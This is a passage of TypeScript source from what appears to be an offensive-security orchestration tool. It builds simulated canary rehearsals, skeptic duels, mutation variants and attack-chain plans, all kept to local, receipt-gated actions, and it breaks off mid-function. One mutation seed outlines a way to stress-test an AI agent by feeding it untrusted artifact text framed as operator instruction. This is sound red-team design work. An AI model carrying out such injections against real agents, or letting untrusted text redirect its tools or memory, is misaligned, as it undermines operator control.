function buildPressureCanary(params: Record<string, unknown>): Record<string, any> {
  const operationDraft = params.operationDraft && typeof params.operationDraft === 'object'
    ? params.operationDraft as Record<string, unknown>
    : {};
  const pressurePaths = params.pressurePaths && typeof params.pressurePaths === 'object'
    ? params.pressurePaths as Record<string, any>
    : buildPressurePaths({ ...params, operationDraft });
  const paths = Array.isArray(pressurePaths.paths) ? pressurePaths.paths as Array<Record<string, any>> : [];
  const requestedPathId = typeof params.pathId === 'string' ? params.pathId : '';
  const path = (requestedPathId ? paths.find(item => item.id === requestedPathId) : undefined) ||
    paths.find(item => item.readiness === 'armed') ||
    paths[0];
  const now = nowIso();

  if (!path) {
    return redactSecrets({
      schema_version: 't3mp3st_pressure_canary/v1',
      generatedAt: now,
      status: 'no_path',
      canary: null,
      evidence: null,
      retest: null,
      nextActions: ['Promote an evidence-backed finding, build repro packs, then plan pressure paths before canary rehearsal.'],
    }) as Record<string, any>;
  }

  const readiness = String(path.readiness || 'needs_repro');
  const status = readiness === 'armed'
    ? 'passed'
    : readiness === 'needs_receipt'
      ? 'gated'
      : readiness === 'blocked'
        ? 'blocked'
        : 'hold';
  const finding = typeof path.findingId === 'string' ? findingsLedger.get(path.findingId) : undefined;
  const simulator = path.safeSimulator && typeof path.safeSimulator === 'object' ? path.safeSimulator as Record<string, unknown> : {};
  const chainStages = Array.isArray(path.chainStages) ? path.chainStages as Array<Record<string, unknown>> : [];
  const noGo = normalizeStringList(path.noGo);
  const chainStageSignals = chainStages.map((stage, index) => ({
    id: typeof stage.id === 'string' ? stage.id : `stage_${index + 1}`,
    label: typeof stage.label === 'string' ? stage.label : `Stage ${index + 1}`,
    status: index === 0 && status === 'gated'
      ? 'gated'
      : status === 'blocked'
        ? 'blocked'
        : status === 'hold' && index > 1
          ? 'not_reached'
          : 'simulated',
    signal: typeof stage.expectedSignal === 'string' ? stage.expectedSignal : 'canary signal inspected',
  }));
  const artifact = {
    id: `canary_${String(path.id || 'pressure').replace(/[^a-zA-Z0-9_-]/g, '_')}_${Date.now()}`,
    mode: 'local_canary',
    pathId: path.id || null,
    findingId: path.findingId || null,
    target: simulator.target || path.target || 'local-lab',
    offensiveScore: path.offensiveScore || 0,
    posture: path.posture || 'simulator',
    status,
    guarantee: 'No live exploitation, credential use, persistence, lateral movement, or state-changing target action was performed.',
    canaryInput: {
      probe: simulator.probe || path.claim || 'Replay local evidence only.',
      expectedSignal: simulator.expectedSignal || path.claim || 'The canary either proves or kills the route.',
      artifactName: simulator.artifact || 'pressure-path-canary.json',
    },
    observedSignal: status === 'passed'
      ? `Local canary matched expected signal for ${path.id || 'pressure path'} without leaving simulator posture.`
      : status === 'gated'
        ? 'Canary stopped at receipt gate before any live or non-local action.'
        : status === 'blocked'
          ? 'Canary preserved blocked route as no-route evidence.'
          : 'Canary held because the repro path is not ready enough for rehearsal.',
    stageSignals: chainStageSignals,
    noGoChecked: noGo,
    falsifiersChecked: [
      'scope_or_receipt_missing',
      'proof_weaker_than_tool_or_replayable',
      'expected_signal_absent',
      'impact_claim_outruns_evidence',
    ],
  };

  let evidence: EvidenceEntry | null = null;
  let retest: RetestRecord | null = null;
  if (params.createEvidence !== false && finding && status === 'passed') {
    evidence = {
      id: newId('evidence'),
      missionId: finding.missionId,
      operationId: finding.operationId,
      findingId: finding.id,
      type: 'artifact',
      title: `Pressure canary (SIMULATION): ${finding.title}`,
      summary: `Local synthetic canary rehearsal — NO live target action. ${artifact.observedSignal} Score ${artifact.offensiveScore}/100; posture ${artifact.posture}.`,
      source: 'system',
      uri: `tempest://pressure-canary/${artifact.id}`,
      // A local synthetic rehearsal is CONTEXT, never 'replayable' proof against the real target.
      // Stamping it 'replayable' let a finding self-promote on fabricated evidence (honesty violation).
      provenanceStrength: 'context',
      resourceIds: finding.resourceIds,
      createdAt: now,
    };
    evidenceLedger.set(evidence.id, evidence);
    finding.evidenceIds = uniqueStrings([...finding.evidenceIds, evidence.id]);
    finding.updatedAt = now;
    findingsLedger.set(finding.id, finding);
  }

  if (params.createRetest !== false && finding && evidence && status === 'passed') {
    retest = {
      id: newId('retest'),
      findingId: finding.id,
      missionId: finding.missionId,
      operationId: finding.operationId,
      status: 'passed',
      method: 'Pressure-path local canary rehearsal; no live target action.',
      acceptanceCriteria: [
        'Canary stays inside local/synthetic simulator posture.',
        'Expected signal is linked to the pressure path.',
        'No-go gates remain explicit in the artifact.',
      ],
      evidenceIds: [evidence.id],
      resultSummary: artifact.observedSignal,
      createdAt: now,
      updatedAt: now,
    };
    retestLedger.set(retest.id, retest);
    finding.retestIds = uniqueStrings([...finding.retestIds, retest.id]);
    finding.updatedAt = now;
    findingsLedger.set(finding.id, finding);
  }

  emitContractEvent('pressure.canary', {
    pathId: path.id || null,
    findingId: path.findingId || null,
    status,
    evidenceId: evidence?.id || null,
    retestId: retest?.id || null,
  });

  return redactSecrets({
    schema_version: 't3mp3st_pressure_canary/v1',
    generatedAt: now,
    status,
    path: {
      id: path.id || null,
      title: path.title || null,
      readiness: path.readiness || null,
      posture: path.posture || null,
      offensiveScore: path.offensiveScore || 0,
      findingId: path.findingId || null,
      family: path.family || null,
    },
    canary: artifact,
    evidence,
    retest,
    nextActions: [
      status === 'passed' ? 'Attach the canary artifact to the evidence graph and ask a skeptic to falsify the route.' : '',
      status === 'gated' ? 'Request explicit mission/action receipt before any non-local or active replay.' : '',
      status === 'hold' ? 'Upgrade repro evidence or finish retests before another canary rehearsal.' : '',
      status === 'blocked' ? 'Keep this as a no-route until the finding status or evidence changes.' : '',
      'Convert surviving canary routes into patch, detector, and regression-test work orders.',
    ].filter(Boolean),
  }) as Record<string, any>;
}

function buildPressureDuel(params: Record<string, unknown>): Record<string, any> {
  const operationDraft = params.operationDraft && typeof params.operationDraft === 'object'
    ? params.operationDraft as Record<string, unknown>
    : {};
  const pressurePaths = params.pressurePaths && typeof params.pressurePaths === 'object'
    ? params.pressurePaths as Record<string, any>
    : buildPressurePaths({ ...params, operationDraft });
  const paths = Array.isArray(pressurePaths.paths) ? pressurePaths.paths as Array<Record<string, any>> : [];
  const requestedPathId = typeof params.pathId === 'string' ? params.pathId : '';
  const path = (requestedPathId ? paths.find(item => item.id === requestedPathId) : undefined) ||
    paths.find(item => item.readiness === 'armed') ||
    paths[0];
  const now = nowIso();

  if (!path) {
    return redactSecrets({
      schema_version: 't3mp3st_pressure_duel/v1',
      generatedAt: now,
      status: 'no_path',
      survivabilityScore: 0,
      duel: null,
      evidence: null,
      workOrder: null,
      nextActions: ['Plan pressure paths before running a skeptic duel.'],
    }) as Record<string, any>;
  }

  const finding = typeof path.findingId === 'string' ? findingsLedger.get(path.findingId) : undefined;
  const findingEvidence = finding
    ? finding.evidenceIds.map(id => evidenceLedger.get(id)).filter(Boolean) as EvidenceEntry[]
    : [];
  const findingRetests = finding
    ? finding.retestIds.map(id => retestLedger.get(id)).filter(Boolean) as RetestRecord[]
    : [];
  const canaryParam = params.pressureCanary && typeof params.pressureCanary === 'object'
    ? params.pressureCanary as Record<string, any>
    : null;
  const canaryEvidence = canaryParam?.evidence?.id
    ? evidenceLedger.get(String(canaryParam.evidence.id))
    : findingEvidence.find(entry => entry.uri?.startsWith('tempest://pressure-canary/') || entry.title.startsWith('Pressure canary:'));
  const canaryRetest = canaryParam?.retest?.id
    ? retestLedger.get(String(canaryParam.retest.id))
    : findingRetests.find(retest => /Pressure-path local canary/i.test(retest.method || ''));
  const strongest = strongestEvidenceStrength(findingEvidence);
  const operationalBlockers = normalizeStringList(path.noGo).filter(item =>
    /without_active_receipt|not_ready|weaker_than|blockers/i.test(item)
  );
  const checks = [
    {
      id: 'scope',
      label: 'Scope and posture',
      passed: path.posture === 'simulator' || path.readiness !== 'needs_receipt',
      weight: 14,
      signal: path.posture === 'simulator'
        ? 'local simulator posture only'
        : path.readiness === 'needs_receipt'
          ? 'receipt gate still blocks live action'
          : 'posture is explicitly gated',
    },
    {
      id: 'repro',
      label: 'Repro readiness',
      passed: path.readiness === 'armed',
      weight: 16,
      signal: String(path.readiness || 'unknown'),
    },
    {
      id: 'evidence',
      label: 'Evidence strength',
      passed: evidenceStrengthRank(strongest) >= evidenceStrengthRank('tool'),
      weight: 14,
      signal: `${strongest} evidence / ${findingEvidence.length} linked`,
    },
    {
      id: 'canary',
      label: 'Canary receipt',
      passed: Boolean(canaryEvidence && canaryRetest?.status === 'passed'),
      weight: 22,
      signal: canaryEvidence && canaryRetest
        ? `${canaryEvidence.id} / ${canaryRetest.id} / ${canaryRetest.status}`
        : 'missing pressure canary evidence or passed retest',
    },
    {
      id: 'no_go',
      label: 'No-go gates',
      passed: operationalBlockers.length === 0,
      weight: 12,
      signal: operationalBlockers.length ? operationalBlockers.join(', ') : 'no active blocker gates triggered',
    },
    {
      id: 'impact',
      label: 'Impact bounded by evidence',
      passed: Number(path.offensiveScore || 0) <= 100 && Boolean(path.claim || finding?.claim),
      weight: 10,
      signal: `${Number(path.offensiveScore || 0)}/100 pressure score`,
    },
    {
      id: 'defensive_conversion',
      label: 'Defensive conversion',
      passed: Array.isArray(path.nextWorkOrders) && path.nextWorkOrders.length >= 2,
      weight: 12,
      signal: `${Array.isArray(path.nextWorkOrders) ? path.nextWorkOrders.length : 0} proposed work orders`,
    },
  ];
  const survivabilityScore = Math.round(checks.reduce((sum, check) => sum + (check.passed ? check.weight : 0), 0));
  const status = survivabilityScore >= 86
    ? 'survived'
    : !canaryEvidence || canaryRetest?.status !== 'passed'
      ? 'needs_canary'
      : survivabilityScore >= 62
        ? 'downgraded'
        : 'killed';
  const skepticBreaks = checks
    .filter(check => !check.passed)
    .map(check => `${check.label}: ${check.signal}`);
  const strongestFalsifier = skepticBreaks[0] ||
    'Find a stale assumption in the canary, evidence provenance, or impact wording.';
  const duel = {
    id: `duel_${String(path.id || 'pressure').replace(/[^a-zA-Z0-9_-]/g, '_')}_${Date.now()}`,
    pathId: path.id || null,
    findingId: path.findingId || null,
    mode: 'hunter_vs_skeptic',
    status,
    survivabilityScore,
    rounds: [
      {
        side: 'hunter',
        claim: `The route is worth pressure because it has ${path.offensiveScore || 0}/100 score and ${String(path.readiness || 'unknown')} readiness.`,
        receipt: canaryEvidence ? `Canary evidence ${canaryEvidence.id}` : 'No canary evidence attached yet.',
      },
      {
        side: 'skeptic',
        claim: strongestFalsifier,
        receipt: skepticBreaks.length ? skepticBreaks.join(' | ') : 'No immediate blocker found; continue adversarial review.',
      },
      {
        side: 'judge',
        claim: status === 'survived'
          ? 'Route survives this local duel and can move toward patch/detector work.'
          : status === 'needs_canary'
            ? 'Route cannot graduate until a local pressure canary is attached.'
            : status === 'downgraded'
              ? 'Route remains interesting but impact or evidence must be narrowed.'
              : 'Route should be preserved as a no-route until new evidence appears.',
        receipt: `${survivabilityScore}/100 survivability`,
      },
    ],
    checks,
    noLiveAction: true,
    generatedAt: now,
  };

  let evidence: EvidenceEntry | null = null;
  if (params.createEvidence !== false && finding) {
    evidence = {
      id: newId('evidence'),
      missionId: finding.missionId,
      operationId: finding.operationId,
      findingId: finding.id,
      type: 'report',
      title: `Pressure duel: ${finding.title}`,
      summary: `Skeptic duel ${status}; survivability ${survivabilityScore}/100. Strongest falsifier: ${strongestFalsifier}`,
      source: 'system',
      uri: `tempest://pressure-duel/${duel.id}`,
      provenanceStrength: canaryEvidence ? 'replayable' : 'context',
      resourceIds: finding.resourceIds,
      createdAt: now,
    };
    evidenceLedger.set(evidence.id, evidence);
    finding.evidenceIds = uniqueStrings([...finding.evidenceIds, evidence.id]);
    finding.updatedAt = now;
    findingsLedger.set(finding.id, finding);
  }

  let workOrder: WorkOrderRecord | null = null;
  let hypothesisId = normalizeStringList(path.hypothesisIds)[0] ||
    (finding ? [...hypothesisLedger.values()].find(hypothesis => hypothesis.findingIds.includes(finding.id))?.id : undefined);
  if (!hypothesisId && finding && params.createWorkOrder !== false) {
    const existingAnchor = [...hypothesisLedger.values()].find(hypothesis =>
      hypothesis.findingIds.includes(finding.id) ||
      (hypothesis.missionId === finding.missionId && hypothesis.claim === `Pressure duel route: ${finding.claim}`)
    );
    if (existingAnchor) {
      hypothesisId = existingAnchor.id;
    } else {
      const anchorHypothesis: HypothesisRecord = {
        id: newId('hypothesis'),
        missionId: finding.missionId,
        operationId: finding.operationId,
        family: finding.family,
        target: finding.target,
        claim: `Pressure duel route: ${finding.claim}`,
        rationale: `Anchor hypothesis created by skeptic duel for ${path.id || finding.id}.`,
        status: status === 'survived' ? 'supported' : 'testing',
        confidence: Math.max(0.55, finding.confidence),
        evidenceForIds: evidence ? [evidence.id] : finding.evidenceIds,
        evidenceAgainstIds: [],
        findingIds: [finding.id],
        nextTests: [
          strongestFalsifier,
          'Independent agent or teammate attempts to falsify the route before final report.',
        ],
        createdAt: now,
        updatedAt: now,
      };
      hypothesisLedger.set(anchorHypothesis.id, anchorHypothesis);
      hypothesisId = anchorHypothesis.id;
    }
  }
  if (params.createWorkOrder !== false && hypothesisId && hypothesisLedger.has(hypothesisId)) {
    const title = status === 'survived'
      ? `Duel follow-up: harden ${path.id || 'pressure path'}`
      : `Duel follow-up: falsify ${path.id || 'pressure path'}`;
    const existing = [...workOrderLedger.values()].find(order =>
      order.hypothesisId === hypothesisId &&
      order.title === title &&
      order.status !== 'completed'
    );
    if (existing) {
      workOrder = existing;
    } else {
      const family = normalizeMissionFamily(path.family, finding?.family || 'web_api');
      workOrder = {
        id: newId('work'),
        hypothesisId,
        missionId: finding?.missionId,
        operationId: finding?.operationId,
        family,
        squad: workOrderSquadForFamily(family),
        kind: status === 'survived' ? 'map_impact' : 'disprove',
        title,
        objective: status === 'survived'
          ? 'Turn the survived pressure route into patch, detector, regression test, and operator runbook work.'
          : `Kill or downgrade this route by proving the strongest falsifier: ${strongestFalsifier}`,
        target: normalizeTargetValue(path.target || finding?.target),
        allowedActions: ['read_only_assessment', 'local_canary', 'route_preview'],
        requiresReceipt: false,
        toolHints: normalizeStringList(path.toolHints).slice(0, 6),
        status: 'queued',
        evidenceIds: evidence ? [evidence.id] : [],
        createdAt: now,
        updatedAt: now,
      };
      workOrderLedger.set(workOrder.id, workOrder);
    }
  }

  emitContractEvent('pressure.duel', {
    pathId: path.id || null,
    findingId: path.findingId || null,
    status,
    survivabilityScore,
    evidenceId: evidence?.id || null,
    workOrderId: workOrder?.id || null,
  });

  return redactSecrets({
    schema_version: 't3mp3st_pressure_duel/v1',
    generatedAt: now,
    status,
    survivabilityScore,
    path: {
      id: path.id || null,
      title: path.title || null,
      readiness: path.readiness || null,
      posture: path.posture || null,
      offensiveScore: path.offensiveScore || 0,
      findingId: path.findingId || null,
      family: path.family || null,
    },
    duel,
    evidence,
    workOrder,
    nextActions: [
      status === 'survived' ? 'Graduate this route into patch, detector, regression, and report work.' : '',
      status === 'needs_canary' ? 'Run a local pressure canary before trusting the route.' : '',
      status === 'downgraded' ? 'Narrow impact wording and rerun the duel after stronger evidence.' : '',
      status === 'killed' ? 'Preserve this as no-route evidence and move attention to the next pressure path.' : '',
      'Keep a skeptic work order open until a teammate or agent independently falsifies the route.',
    ].filter(Boolean),
  }) as Record<string, any>;
}

function buildPressureMutations(params: Record<string, unknown>): Record<string, any> {
  const operationDraft = params.operationDraft && typeof params.operationDraft === 'object'
    ? params.operationDraft as Record<string, unknown>
    : {};
  const pressurePaths = params.pressurePaths && typeof params.pressurePaths === 'object'
    ? params.pressurePaths as Record<string, any>
    : buildPressurePaths({ ...params, operationDraft });
  const paths = Array.isArray(pressurePaths.paths) ? pressurePaths.paths as Array<Record<string, any>> : [];
  const requestedPathId = typeof params.pathId === 'string' ? params.pathId : '';
  const path = (requestedPathId ? paths.find(item => item.id === requestedPathId) : undefined) ||
    paths.find(item => item.readiness === 'armed') ||
    paths[0];
  const now = nowIso();

  if (!path) {
    return redactSecrets({
      schema_version: 't3mp3st_pressure_mutations/v1',
      generatedAt: now,
      status: 'no_path',
      summary: { total: 0, queued: 0, maxFangScore: 0 },
      mutations: [],
      evidence: null,
      workOrders: [],
      nextActions: ['Plan pressure paths before running mutation gauntlet.'],
    }) as Record<string, any>;
  }

  const finding = typeof path.findingId === 'string' ? findingsLedger.get(path.findingId) : undefined;
  const duelParam = params.pressureDuel && typeof params.pressureDuel === 'object'
    ? params.pressureDuel as Record<string, any>
    : null;
  const duelEvidence = duelParam?.evidence?.id
    ? evidenceLedger.get(String(duelParam.evidence.id))
    : finding?.evidenceIds
      .map(id => evidenceLedger.get(id))
      .filter(Boolean)
      .find(entry => entry?.uri?.startsWith('tempest://pressure-duel/'));
  const survivedDuel = duelParam?.status === 'survived' || Boolean(duelEvidence);
  const family = normalizeMissionFamily(path.family, finding?.family || 'web_api');
  const target = normalizeTargetValue(path.target || finding?.target || operationDraft.target);
  const baseScore = Math.max(20, Math.min(100, Number(path.offensiveScore || 50)));
  const mutationSeeds = [
    {
      id: 'assumption_inversion',
      lane: 'skeptic',
      angle: 'Invert the strongest assumption',
      hypothesis: `If the observed signal is real, what opposite assumption still makes ${path.id || 'the route'} fail?`,
      probe: 'Replay the local canary while flipping one trusted assumption: actor, state, time, or parser boundary.',
      expected: 'One assumption flip either preserves impact or cleanly kills the route.',
      falsifier: 'The route only works under one brittle assumption that was not in the mission contract.',
      artifact: 'assumption matrix and killed/survived labels',
      bonus: 4,
    },
    {
      id: 'state_desync',
      lane: 'web_api',
      angle: 'Stale state and UI/API drift',
      hypothesis: 'A valid local state transition can make readiness, proof, or authority appear different across surfaces.',
      probe: 'Use ledger snapshots, stale counters, and route previews to compare UI state against API truth.',
      expected: 'A mismatch either produces a new blocked-state finding or hardens the status contract.',
      falsifier: 'All surfaces agree after refresh, bundle export, and gate review.',
      artifact: 'state-consistency canary and UI/API invariant',
      bonus: 8,
    },
    {
      id: 'cross_lane_pivot',
      lane: 'agent_warfare',
      angle: 'Cross-lane composition',
      hypothesis: `The ${family} route becomes sharper when composed with agent memory, tool output, or delegated work-order drift.`,
      probe: 'Build a synthetic transcript where the pressure-path evidence is treated as untrusted data, tool output, and operator instruction in contrast.',
      expected: 'Authority labels prevent role confusion or reveal a new work-order drift hypothesis.',
      falsifier: 'The agent never changes tool choice, memory proposal, or gate status based on untrusted artifact text.',
      artifact: 'agent authority contrast set',
      bonus: 12,
    },
    {
      id: 'receipt_boundary',
      lane: 'operator',
      angle: 'Receipt edge pressure',
      hypothesis: 'The route can be made safer or sharper by proving exactly which receipt is required at each escalation edge.',
      probe: 'Route the path through preview, local canary, command receipt, and mission receipt without executing live actions.',
      expected: 'Every transition has one clear receipt or blocks with a precise reason.',
      falsifier: 'Any active step can proceed with the wrong receipt, wildcard receipt, stale receipt, or no receipt.',
      artifact: 'receipt transition table',
      bonus: 10,
    },
    {
      id: 'defensive_regression',
      lane: 'defense',
      angle: 'Convert fang into regression',
      hypothesis: 'The most dangerous survived variant can become a repeatable detector, patch test, or runbook gate.',
      probe: 'Translate the canary and duel into a failing-then-passing regression fixture with a named owner.',
      expected: 'The route has a concrete patch, detector, monitor, or invariant that catches recurrence.',
      falsifier: 'The route remains interesting but cannot produce a test, detector, or owner action.',
      artifact: 'regression fixture and owner handoff',
      bonus: 6,
    },
  ];

  const mutations = mutationSeeds.map((seed, index) => {
    const fangScore = Math.max(0, Math.min(100, Math.round(
      baseScore * 0.62 +
      seed.bonus +
      (survivedDuel ? 16 : 4) +
      (path.readiness === 'armed' ? 8 : 0) -
      (index * 2)
    )));
    return {
      id: `mutation_${String(path.id || 'pressure').replace(/[^a-zA-Z0-9_-]/g, '_')}_${seed.id}`,
      pathId: path.id || null,
      findingId: path.findingId || null,
      lane: seed.lane,
      angle: seed.angle,
      family: seed.lane === 'agent_warfare' ? 'agent_warfare' : family,
      fangScore,
      status: survivedDuel ? 'queued' : 'needs_duel',
      hypothesis: seed.hypothesis,
      localProbe: seed.probe,
      expectedSignal: seed.expected,
      falsifier: seed.falsifier,
      defensiveArtifact: seed.artifact,
      containment: 'local synthetic fixtures, route preview, canary artifacts, and read-only ledger inspection only',
      toolHints: uniqueStrings([
        ...normalizeStringList(path.toolHints).slice(0, 4),
        seed.lane === 'agent_warfare' ? 'promptfoo' : '',
        seed.lane === 'web_api' ? 'playwright' : '',
        seed.lane === 'operator' ? 'evidence-graph' : '',
        seed.lane === 'defense' ? 'json-schema' : '',
      ].filter(Boolean)),
    };
  }).sort((a, b) => b.fangScore - a.fangScore);

  let evidence: EvidenceEntry | null = null;
  if (params.createEvidence !== false && finding) {
    evidence = {
      id: newId('evidence'),
      missionId: finding.missionId,
      operationId: finding.operationId,
      findingId: finding.id,
      type: 'report',
      title: `Mutation gauntlet: ${finding.title}`,
      summary: `Generated ${mutations.length} local-only pressure mutations for ${path.id || finding.id}; top fang ${mutations[0]?.fangScore || 0}/100.`,
      source: 'system',
      uri: `tempest://pressure-mutations/${String(path.id || finding.id).replace(/[^a-zA-Z0-9_-]/g, '_')}/${Date.now()}`,
      provenanceStrength: survivedDuel ? 'replayable' : 'context',
      resourceIds: finding.resourceIds,
      createdAt: now,
    };
    evidenceLedger.set(evidence.id, evidence);
    finding.evidenceIds = uniqueStrings([...finding.evidenceIds, evidence.id]);
    finding.updatedAt = now;
    findingsLedger.set(finding.id, finding);
  }

  let hypothesisId = normalizeStringList(path.hypothesisIds)[0] ||
    (finding ? [...hypothesisLedger.values()].find(hypothesis => hypothesis.findingIds.includes(finding.id))?.id : undefined);
  if (!hypothesisId && finding && params.createWorkOrders !== false) {
    const anchorHypothesis: HypothesisRecord = {
      id: newId('hypothesis'),
      missionId: finding.missionId,
      operationId: finding.operationId,
      family: finding.family,
      target: finding.target,
      claim: `Mutation gauntlet route: ${finding.claim}`,
      rationale: `Anchor hypothesis created by mutation gauntlet for ${path.id || finding.id}.`,
      status: survivedDuel ? 'testing' : 'open',
      confidence: Math.max(0.55, finding.confidence),
      evidenceForIds: evidence ? [evidence.id] : finding.evidenceIds,
      evidenceAgainstIds: [],
      findingIds: [finding.id],
      nextTests: mutations.slice(0, 3).map(mutation => mutation.falsifier),
      createdAt: now,
      updatedAt: now,
    };
    hypothesisLedger.set(anchorHypothesis.id, anchorHypothesis);
    hypothesisId = anchorHypothesis.id;
  }

  const workOrders: WorkOrderRecord[] = [];
  if (params.createWorkOrders !== false && hypothesisId && hypothesisLedger.has(hypothesisId)) {
    for (const mutation of mutations.slice(0, 3)) {
      const title = `Mutation gauntlet: ${mutation.angle}`;
      const existing = [...workOrderLedger.values()].find(order =>
        order.hypothesisId === hypothesisId &&
        order.title === title &&
        order.status !== 'completed'
      );
      if (existing) {
        workOrders.push(existing);
        continue;
      }
      const mutationFamily = normalizeMissionFamily(mutation.family, family);
      const order: WorkOrderRecord = {
        id: newId('work'),
        hypothesisId,
        missionId: finding?.missionId,
        operationId: finding?.operationId,
        family: mutationFamily,
        squad: workOrderSquadForFamily(mutationFamily),
        kind: mutation.lane === 'defense' ? 'retest_design' : mutation.lane === 'skeptic' ? 'disprove' : 'tool_probe',
        title,
        objective: `${mutation.hypothesis} Probe locally: ${mutation.localProbe}`,
        target,
        allowedActions: ['read_only_assessment', 'local_canary', 'route_preview'],
        requiresReceipt: false,
        toolHints: normalizeStringList(mutation.toolHints),
        status: mutation.status === 'queued' ? 'queued' : 'blocked',
        evidenceIds: evidence ? [evidence.id] : [],
        resultSummary: mutation.status === 'queued'
          ? `Queued from mutation gauntlet with fang score ${mutation.fangScore}/100.`
          : 'Blocked until the pressure path survives a skeptic duel.',
        createdAt: now,
        updatedAt: now,
      };
      workOrderLedger.set(order.id, order);
      workOrders.push(order);
    }
  }

  const summary = {
    total: mutations.length,
    queued: mutations.filter(mutation => mutation.status === 'queued').length,
    needsDuel: mutations.filter(mutation => mutation.status === 'needs_duel').length,
    maxFangScore: mutations.reduce((max, mutation) => Math.max(max, mutation.fangScore), 0),
    workOrders: workOrders.length,
    topLane: mutations[0]?.lane || null,
  };
  emitContractEvent('pressure.mutations', {
    pathId: path.id || null,
    findingId: path.findingId || null,
    total: summary.total,
    maxFangScore: summary.maxFangScore,
    workOrderIds: workOrders.map(order => order.id),
  });

  return redactSecrets({
    schema_version: 't3mp3st_pressure_mutations/v1',
    generatedAt: now,
    status: survivedDuel ? 'queued' : 'needs_duel',
    path: {
      id: path.id || null,
      title: path.title || null,
      readiness: path.readiness || null,
      posture: path.posture || null,
      offensiveScore: path.offensiveScore || 0,
      findingId: path.findingId || null,
      family: path.family || null,
    },
    doctrine: {
      stance: 'mutate survived routes into local-only variants before any claim graduates',
      noLiveAction: true,
    },
    summary,
    mutations,
    evidence,
    workOrders,
    nextActions: [
      survivedDuel ? 'Send the top mutation to a specialist agent with the local probe and falsifier attached.' : 'Run a skeptic duel before trusting mutation results.',
      'Treat every mutation as a hypothesis until evidence, canary, and retest receipts support it.',
      'Promote only the variants that produce patch, detector, runbook, or regression artifacts.',
    ],
  }) as Record<string, any>;
}

function buildPressureChains(params: Record<string, unknown>): Record<string, any> {
  const operationDraft = params.operationDraft && typeof params.operationDraft === 'object'
    ? params.operationDraft as Record<string, unknown>
    : {};
  const pressurePaths = params.pressurePaths && typeof params.pressurePaths === 'object'
    ? params.pressurePaths as Record<string, any>
    : buildPressurePaths({ ...params, operationDraft });
  const paths = Array.isArray(pressurePaths.paths) ? pressurePaths.paths as Array<Record<string, any>> : [];
  const requestedPathId = typeof params.pathId === 'string' ? params.pathId : '';
  const path = (requestedPathId ? paths.find(item => item.id === requestedPathId) : undefined) ||
    paths.find(item => item.readiness === 'armed') ||
    paths[0];
  const now = nowIso();

  if (!path) {
    return redactSecrets({
      schema_version: 't3mp3st_pressure_chains/v1',
      generatedAt: now,
      status: 'no_path',
      summary: { total: 0, queued: 0, maxChainScore: 0, workOrders: 0 },
      chains: [],
      evidence: null,
      workOrders: [],
      nextActions: ['Plan pressure paths and run the mutation gauntlet before composing fang chains.'],
    }) as Record<string, any>;
  }

  const finding = typeof path.findingId === 'string' ? findingsLedger.get(path.findingId) : undefined;
  const mutationsEnvelope = params.pressureMutations && typeof params.pressureMutations === 'object'
    ? params.pressureMutations as Record<string, any>
    : buildPressureMutations({ ...params, operationDraft, pressurePaths, pathId: path.id });
  const mutations = (Array.isArray(mutationsEnvelope.mutations) ? mutationsEnvelope.mutations as Array<Record<string, any>> : [])
    .slice()
    .sort((a, b) => Number(b.fangScore || 0) - Number(a.fangScore || 0));

  if (!mutations.length) {
    return redactSecrets({
      schema_version: 't3mp3st_pressure_chains/v1',
      generatedAt: now,
      status: 'no_mutations',
      path: {
        id: path.id || null,
        title: path.title || null,
        findingId: path.findingId || null,
      },
      summary: { total: 0, queued: 0, maxChainScore: 0, workOrders: 0 },
      chains: [],
      evidence: null,
      workOrders: [],
      nextActions: ['Run the mutation gauntlet so the composer has strange routes to combine.'],
    }) as Record<string, any>;
  }

  const family = normalizeMissionFamily(path.family, finding?.family || 'web_api');
  const target = normalizeTargetValue(path.target || finding?.target || operationDraft.target);
  const topMutations = mutations.slice(0, 5);
  const mutationBySeed = (seed: string) => topMutations.find(mutation => String(mutation.id || '').includes(seed));
  const uniqueMutationSet = (items: Array<Record<string, any> | undefined>) => {
    const seen = new Set<string>();
    return items.filter((mutation): mutation is Record<string, any> => {
      if (!mutation) return false;
      const key = String(mutation.id || mutation.angle || mutation.hypothesis || seen.size);
      if (seen.has(key)) return false;
      seen.add(key);
      return true;
    });
  };
  const chainSeeds = [
    {
      id: 'weird_machine_spine',
      title: 'Weird-machine spine',
      intent: 'Compose the strongest survived route with the strangest mutation pair.',
      mutations: uniqueMutationSet([topMutations[0], topMutations[1], topMutations[2]]),
      bonus: 12,
    },
    {
      id: 'authority_collision',
      title: 'Authority collision route',
      intent: 'Pressure the exact boundary where receipt, UI state, and agent authority could disagree.',
      mutations: uniqueMutationSet([
        mutationBySeed('receipt_boundary'),
        mutationBySeed('state_desync'),
        mutationBySeed('cross_lane_pivot'),
        topMutations[0],
      ]),
      bonus: 10,
    },
    {
      id: 'defense_breaker',
      title: 'Defense regression breaker',
      intent: 'Force the sharpest route to become a patch, detector, runbook, or regression gate.',
      mutations: uniqueMutationSet([
        mutationBySeed('defensive_regression'),
        mutationBySeed('assumption_inversion'),
        topMutations[0],
      ]),
      bonus: 8,
    },
  ];
  const simulator = path.safeSimulator && typeof path.safeSimulator === 'object' ? path.safeSimulator as Record<string, unknown> : {};
  const baseScore = Math.max(0, Math.min(100, Number(path.offensiveScore || 50)));
  const mutationStatus = String(mutationsEnvelope.status || 'unknown');
  const chains = chainSeeds.map(seed => {
    const selected = seed.mutations.length >= 2 ? seed.mutations : uniqueMutationSet([...seed.mutations, ...topMutations]).slice(0, 2);
    const avgFang = selected.length
      ? selected.reduce((sum, mutation) => sum + Number(mutation.fangScore || 0), 0) / selected.length
      : 0;
    const crossLaneCount = new Set(selected.map(mutation => String(mutation.lane || mutation.family || 'unknown'))).size;
    const chainScore = Math.max(0, Math.min(100, Math.round(
      baseScore * 0.28 +
      avgFang * 0.52 +
      crossLaneCount * 4 +
      selected.length * 3 +
      seed.bonus +
      (mutationStatus === 'queued' ? 6 : -8)
    )));
    const status = mutationStatus === 'queued' && chainScore >= 72 ? 'queued' : 'hold';
    const selectedIds = selected.map(mutation => String(mutation.id || mutation.angle || 'mutation'));
    const stages = [
      {
        id: 'anchor_route',
        label: 'Anchor route',
        owner: 'hunter',
        objective: path.claim || path.capabilityHypothesis || 'Start from the evidence-backed pressure route.',
        localProbe: simulator.probe || 'Replay local evidence only.',
        expectedSignal: simulator.expectedSignal || path.claim || 'Anchor signal remains reproducible in local canary posture.',
        evidenceNeeded: simulator.artifact || 'pressure-path-canary.json',
      },
      ...selected.map((mutation, index) => ({
        id: `mutation_${index + 1}`,
        label: mutation.angle || `Mutation ${index + 1}`,
        owner: mutation.lane || 'specialist',
